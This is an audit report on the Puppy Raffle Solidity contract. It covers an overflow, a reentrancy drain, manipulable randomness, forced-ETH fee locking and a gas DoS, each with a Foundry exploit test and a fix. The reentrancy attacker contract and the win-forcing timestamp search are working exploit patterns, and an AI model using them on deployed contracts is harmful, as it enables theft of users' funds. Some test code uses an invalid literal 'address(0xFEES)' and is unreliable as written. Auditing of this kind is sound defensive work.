# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### Puppy Raffle Protocol

Puppy Raffle is an on-chain raffle that lets anyone vie for a cute dog NFT. Players call `enterRaffle`, passing an array of addresses and sending `entranceFee × n` ETH. The contract rejects duplicate addresses and records entrants in `players`. Until `raffleDuration` elapses, any entrant may call `refund` to reclaim their stake; only the player herself can trigger her own refund.

When the timer is up, anyone can invoke `selectWinner`. The function picks a pseudo-random player index, mints an ERC-721 puppy with rarity metadata, transfers the prize pot minus fees to the winner, and routes accumulated fees to `feeAddress`. The last winner is stored in `previousWinner` for transparency.

If no players are active, the owner can call `withdrawFees` to collect residual fees and may update `feeAddress` through `changeFeeAddress`.

Extensive Foundry tests cover entering, duplicate prevention, refunds, winner payout, URI correctness, and fee withdrawal. A Forge script automates deployment with a 1 ETH entrance fee, the deployer as `feeAddress`, and a 1-day raffle duration.

In short, Puppy Raffle combines a fair ticketing mechanism, secure fund handling, and NFT rewards in under 300 lines of Solidity.
## High Risk Findings
[H-1]. Integer Overflow issue in PuppyRaffle::selectWinner
[H-2]. Reentrancy issue in PuppyRaffle::refund
[H-3]. Randomness issue in PuppyRaffle::selectWinner
[H-4]. Unexpected Eth issue in PuppyRaffle::withdrawFees
## Medium Risk Findings
[M-1]. DOS issue in PuppyRaffle::enterRaffle


### Number of Findings
- C: 0
- H: 4
- M: 1
- L: 0
- I: 0



# High Risk Findings

## [H-1]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
The `totalFees` state variable is of type `uint64`, while the fee calculation results in a `uint256`. In `selectWinner`, the line `totalFees = totalFees + uint64(fee)` casts the `uint256` fee down to a `uint64`. If the fee for a single round exceeds `2^64 - 1` (approx. 18.4 ETH), the value will be truncated, causing an incorrect and much smaller amount to be added to `totalFees`. Furthermore, `totalFees` itself can overflow the `uint64` type if total accumulated fees exceed this limit. This leads to incorrect accounting and permanent loss of fees for the protocol owner.

## Impact
The protocol will under-report its collected fees, leading to a direct loss of funds for the `feeAddress`. The `withdrawFees` function will be unable to withdraw the correct amount, and the difference will be permanently trapped in the contract.

## Proof of Concept
1. A raffle is configured with an `entranceFee` such that the 20% fee for a full raffle will exceed `2^64 - 1`. For example, an `entranceFee` of 10 ETH with 10 players would result in a prize pool of 100 ETH and a fee of 20 ETH.
2. `fee` is calculated as `20 * 10^18`.
3. The cast `uint64(fee)` truncates this value, storing a much smaller number.
4. `totalFees` is incremented by this incorrect, small number.
5. The contract's ETH balance reflects the true 20 ETH fee, but `totalFees` reflects the small, truncated value. The `withdrawFees` function will fail or withdraw the wrong amount.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleIntegerTest is Test {
    PuppyRaffle puppyRaffle;
    // Set a large entrance fee to trigger overflow on uint64
    uint256 public constant ENTRANCE_FEE = 10 ether;
    uint32 public constant RAFFLE_DURATION = 1 hours;
    address public feeAddress = address(0xFEES);

    function setUp() public {
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, RAFFLE_DURATION);
    }

    function testTotalFeesOverflow() public {
        // Enter 10 players. Total collected: 100 ETH. Fee: 20 ETH.
        // 20 ETH is > type(uint64).max (~18.4 ETH)
        uint256 numPlayers = 10;
        address[] memory players_ = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            players_[i] = address(uint160(i + 1));
        }
        puppyRaffle.enterRaffle{value: numPlayers * ENTRANCE_FEE}(players_);
        skip(RAFFLE_DURATION + 1);

        uint256 expectedFee = (numPlayers * ENTRANCE_FEE * 20) / 100;
        assertEq(expectedFee, 20 ether);

        puppyRaffle.selectWinner();

        uint256 storedTotalFees = puppyRaffle.totalFees();

        // The stored fee will be truncated due to the uint64 cast
        uint256 truncatedFee = uint64(expectedFee);
        assertEq(storedTotalFees, truncatedFee);
        assertLt(storedTotalFees, expectedFee);

        // The withdraw function is now broken because balance != totalFees
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}
```

## Suggested Mitigation
Change the type of the `totalFees` state variable from `uint64` to `uint256`. This will prevent both the truncation from the downcast and any potential overflow for all realistic scenarios. Also, remove the unnecessary cast in the `selectWinner` function.

```diff
// src/PuppyRaffle.sol

    // We do some storage packing to save gas
    address public feeAddress;
-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;

// ... in selectWinner() ...
        uint256 fee = (totalAmountCollected * 20) / 100;
-       totalFees = totalFees + uint64(fee);
+       totalFees = totalFees + fee;
```

## [H-2]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function sends Ether to a user before updating the internal state that tracks their participation. Specifically, `payable(msg.sender).sendValue(entranceFee)` is called before `players[playerIndex] = address(0)`. This violates the Checks-Effects-Interactions pattern and creates a classic reentrancy vulnerability. An attacker can create a contract that calls `refund` and, within its `receive()` fallback function, calls `refund` again. Because the state has not been updated, the contract still considers the attacker an active player, allowing them to be "refunded" multiple times until the contract's balance is drained.

## Impact
A malicious actor can drain the entire contract balance, stealing all funds from legitimate participants and all accrued fees. This leads to a total and permanent loss of funds for the protocol and its users.

## Proof of Concept
1. An attacker deploys a contract (`Attacker.sol`).
2. The attacker uses this contract to enter the `PuppyRaffle` by calling `enterRaffle`.
3. The attacker then calls a function on their contract that initiates the attack by calling `puppyRaffle.refund()`.
4. `PuppyRaffle` sends the refund amount to the `Attacker` contract.
5. The `Attacker` contract's `receive()` function is triggered. Inside this function, it immediately calls `puppyRaffle.refund()` again.
6. Since `players[playerIndex]` has not yet been set to `address(0)`, the checks pass, and another refund is sent.
7. This process repeats within the same transaction, draining the `PuppyRaffle` contract of all its ETH.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract Attacker {
    PuppyRaffle public puppyRaffle;
    uint256 public constant ENTRANCE_FEE = 1 ether;
    uint256 public playerIndex;
    uint256 public attackCount = 0;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }

    function enter() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: msg.value}(players);
    }

    function setPlayerIndex(uint256 _index) public {
        playerIndex = _index;
    }

    function attack() public {
        puppyRaffle.refund(playerIndex);
    }

    receive() external payable {
        attackCount++;
        if (attackCount < 10 && address(puppyRaffle).balance >= ENTRANCE_FEE) {
            puppyRaffle.refund(playerIndex);
        }
    }
}

contract PuppyRaffleReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    Attacker attacker;
    address public constant USER = address(1);
    uint256 public constant ENTRANCE_FEE = 1 ether;
    uint32 public constant RAFFLE_DURATION = 1 hours;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, address(this), RAFFLE_DURATION);
        attacker = new Attacker(puppyRaffle);

        // Another user enters to provide funds to steal
        address[] memory users = new address[](1);
        users[0] = USER;
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(users);
    }

    function testReentrancyRefund() public {
        // Attacker enters the raffle
        attacker.enter{value: ENTRANCE_FEE}();
        uint256 attackerIndex = puppyRaffle.getActivePlayerIndex(address(attacker));
        attacker.setPlayerIndex(attackerIndex);

        uint256 contractBalanceBefore = address(puppyRaffle).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;

        // Start the attack
        attacker.attack();

        uint256 contractBalanceAfter = address(puppyRaffle).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;

        // The attacker should have drained both their own and the user's entry fee
        assertEq(contractBalanceAfter, 0);
        assertEq(attackerBalanceAfter, attackerBalanceBefore + contractBalanceBefore);
    }
}
```

## Suggested Mitigation
Apply the Checks-Effects-Interactions pattern by updating the state before sending Ether. Move the `players[playerIndex] = address(0);` line before the `payable(msg.sender).sendValue(entranceFee);` call.

```diff
// src/PuppyRaffle.sol

        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

-       payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
+       players[playerIndex] = address(0);
+       payable(msg.sender).sendValue(entranceFee);
        emit RaffleRefunded(playerAddress);
```

## [H-3]. Randomness issue in PuppyRaffle::selectWinner

## Description
The winner selection and NFT rarity determination rely on `keccak256` hashes of on-chain data like `block.timestamp`, `block.difficulty`, and `msg.sender`. These values are predictable and can be influenced by block producers (miners/validators). A malicious validator can compute the outcome of a `selectWinner` call before including it in a block. They can choose to only include transactions that result in them winning, or they can manipulate the block's timestamp to alter the outcome in their favor. This fundamentally breaks the fairness and randomness of the raffle.

## Impact
The raffle is not fair. Malicious actors, particularly validators, can exploit the predictable randomness to disproportionately increase their chances of winning. This undermines the integrity of the protocol and leads to theft of the prize pool from legitimate participants.

## Proof of Concept
An attacker simply searches future timestamps until the hash `keccak256(abi.encodePacked(attacker, futureTimestamp, block.difficulty))` resolves to their index in the players array. A validator can do this off-chain and only include the transaction with a favourable timestamp in the block they create, while a normal user can front-run with the crafted timestamp.

High-level steps:
1. Raffle has at least four players, including the attacker.
2. After `raffleDuration` elapses, attacker simulates `selectWinner` for a range of candidate timestamps.
3. For any timestamp that makes them win, they set the tx’s `block.timestamp` (possible for a validator) or spam several transactions with gas bribes until one lands on a winning timestamp.
4. They call `selectWinner` and receive 80 % of the pot plus the NFT.

Because `msg.sender` is also part of the entropy, the attacker always uses their own address when computing the hash, giving them total control over two of the three inputs.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RandomnessExploitTest is Test {
    PuppyRaffle raffle;
    address attacker = address(0xBAD);

    address[] internal entrants;
    uint256 constant FEE = 1 ether;
    uint256 constant DURATION = 1 hours;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(this), DURATION);

        entrants.push(address(0x1));
        entrants.push(address(0x2));
        entrants.push(address(0x3));
        entrants.push(attacker);

        uint256 total = FEE * entrants.length;
        vm.deal(attacker, total);
        vm.prank(attacker);
        raffle.enterRaffle{value: total}(entrants);

        // Fast-forward until the raffle is drawable
        vm.warp(block.timestamp + DURATION + 1);
    }

    function testAttackerCanForceWin() public {
        // Search a 30-second window for a favourable timestamp
        for (uint256 i = 0; i < 30; i++) {
            uint256 ts = block.timestamp + i;
            uint256 idx = uint256(
                keccak256(abi.encodePacked(attacker, ts, block.difficulty))
            ) % entrants.length;

            if (raffle.players(idx) == attacker) {
                vm.warp(ts);           // validator sets the timestamp
                vm.prank(attacker);
                raffle.selectWinner();
                assertEq(raffle.previousWinner(), attacker);
                return;
            }
        }
        fail("No winning timestamp found in search window");
    }
}

## Suggested Mitigation
Replace the in-contract pseudo-randomness with an external, unbiasable randomness source such as Chainlink VRF or EigenLayer’s AVS RNG. The random value should be obtained in a two-step workflow (request → callback) and used only inside `fulfillRandomWords` (or equivalent) to calculate `winnerIndex` and rarity. Remove any dependence on easily manipulated on-chain variables like msg.sender, block.timestamp, or block.difficulty.

## [H-4]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function uses a strict equality check `require(address(this).balance == uint256(totalFees), ...)` to verify that no raffle is active. This check is brittle and can be easily broken. If any amount of Ether, even 1 wei, is forcibly sent to the contract (e.g., via `selfdestruct` or as a coinbase transaction reward), the contract's balance will no longer equal `totalFees`. This will cause the `require` statement to fail permanently, making it impossible to withdraw any collected fees.

## Impact
All accrued fees for the protocol owner can be permanently locked in the contract by any malicious actor. This results in a direct and permanent loss of funds.

## Proof of Concept
1. The raffle runs for one or more rounds, and `totalFees` accumulates.
2. After a round ends, `address(this).balance` is equal to `totalFees`.
3. A malicious user deploys a contract that self-destructs and sends 1 wei to the `PuppyRaffle` contract address.
4. `address(this).balance` is now `totalFees + 1`.
5. The check `address(this).balance == uint256(totalFees)` will now always be false.
6. The `withdrawFees` function is permanently disabled, and all fees are trapped.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ForceSend {
    function send(address payable recipient) public payable {
        selfdestruct(recipient);
    }
}

contract PuppyRaffleUnexpectedEthTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 public constant ENTRANCE_FEE = 1 ether;
    uint32 public constant RAFFLE_DURATION = 1 hours;
    address public feeAddress = address(0xFEES);

    function setUp() public {
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, RAFFLE_DURATION);
        address[] memory players_ = new address[](4);
        for (uint256 i = 0; i < 4; i++) {
            players_[i] = address(uint160(i + 1));
        }
        puppyRaffle.enterRaffle{value: 4 * ENTRANCE_FEE}(players_);
        skip(RAFFLE_DURATION + 1);
        puppyRaffle.selectWinner();
        // At this point, address(puppyRaffle).balance == puppyRaffle.totalFees()
    }

    function testFeeWithdrawalBrickedByUnexpectedEth() public {
        // Verify that fees could be withdrawn initially
        uint256 fees = puppyRaffle.totalFees();
        assertEq(address(puppyRaffle).balance, fees);

        // Force send 1 wei to the contract
        ForceSend forceSend = new ForceSend();
        forceSend.send{value: 1 wei}(payable(address(puppyRaffle)));

        // Now balance is > totalFees
        assertEq(address(puppyRaffle).balance, fees + 1);

        // Attempting to withdraw fees now will fail
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}
```

## Suggested Mitigation
Do not rely on the contract ETH balance. Instead track the number of *active* players explicitly and gate fee withdrawal on that value:

uint256 public activePlayerCount;

// in enterRaffle():
activePlayerCount += newPlayers.length;

// in refund():
activePlayerCount -= 1;

// in selectWinner():
activePlayerCount = 0; // all players cleared

function withdrawFees() external {
    require(activePlayerCount == 0, "PuppyRaffle: There are currently players active");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}

This logic is immune to unsolicited ETH transfers and correctly handles refunded players still occupying array slots.



# Medium Risk Findings

## [M-1]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function checks for duplicate players by iterating through the `players` array with nested loops. This approach has a time complexity of O(n^2), where n is the total number of players. As the number of players grows, the gas cost to execute `enterRaffle` increases quadratically. An attacker can exploit this by entering a large number of unique addresses into the raffle, making the gas cost for subsequent `enterRaffle` calls prohibitively expensive and eventually exceed the block gas limit. This effectively prevents anyone else from joining the raffle.

## Impact
The core functionality of entering the raffle can be disabled, preventing new users from participating. This can halt the protocol's operation and lock any fees that have been collected but not yet withdrawn.

## Proof of Concept
1. An attacker calls `enterRaffle` repeatedly with arrays of new, unique addresses, bloating the `players` array.
2. With each call, the gas cost of the duplicate check inside `enterRaffle` increases quadratically.
3. After the `players` array reaches a certain size, any new call to `enterRaffle`, even with a single new player, will consume more gas than the block gas limit allows.
4. The transaction will always revert, making it impossible for new users to join the raffle.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleDoSTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant RAFFLE_DURATION = 1 hours;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(this), RAFFLE_DURATION);
    }

    function _batchPlayers(uint256 start, uint256 count) internal pure returns (address[] memory list) {
        list = new address[](count);
        for (uint256 i; i < count; i++) {
            list[i] = address(uint160(start + i));
        }
    }

    // Demonstrates super-linear gas growth of enterRaffle
    function testGasExplodesWithPlayers() public {
        // first 50 players
        address[] memory first = _batchPlayers(1, 50);
        raffle.enterRaffle{value: 50 * ENTRANCE_FEE}(first);

        // next 50 players on the SAME contract
        address[] memory second = _batchPlayers(51, 50);
        uint256 gasBefore = gasleft();
        raffle.enterRaffle{value: 50 * ENTRANCE_FEE}(second);
        uint256 gasUsedSame = gasBefore - gasleft();

        // same 50 players on a FRESH contract (O(n) expected)
        PuppyRaffle fresh = new PuppyRaffle(ENTRANCE_FEE, address(this), RAFFLE_DURATION);
        gasBefore = gasleft();
        fresh.enterRaffle{value: 50 * ENTRANCE_FEE}(second);
        uint256 gasUsedFresh = gasBefore - gasleft();

        // Gas on the dosed contract should be at least twice that on a fresh one
        assertTrue(gasUsedSame > gasUsedFresh * 2, "gas did not grow super-linearly");
    }
}

## Suggested Mitigation
Replace the O(n^2) duplicate check with a more gas-efficient mechanism. A common solution is to use a mapping to track which addresses have entered the current raffle. When a new round starts, this mapping can be cleared or a new one effectively started by incrementing a round counter.

```diff
// src/PuppyRaffle.sol
+   uint256 public currentRaffleId = 0;
+   mapping(uint256 => mapping(address => bool)) public playerInRaffle;

    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
+           address player = newPlayers[i];
+           require(!playerInRaffle[currentRaffleId][player], "PuppyRaffle: Duplicate player");
+           playerInRaffle[currentRaffleId][player] = true;
            players.push(newPlayers[i]);
        }

-       // Check for duplicates
-       for (uint256 i = 0; i < players.length - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
-               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-           }
-       }
        emit RaffleEnter(newPlayers);
    }

    function selectWinner() external {
        // ...
+       currentRaffleId++;
        delete players;
        raffleStartTime = block.timestamp;
        // ...
    }
```



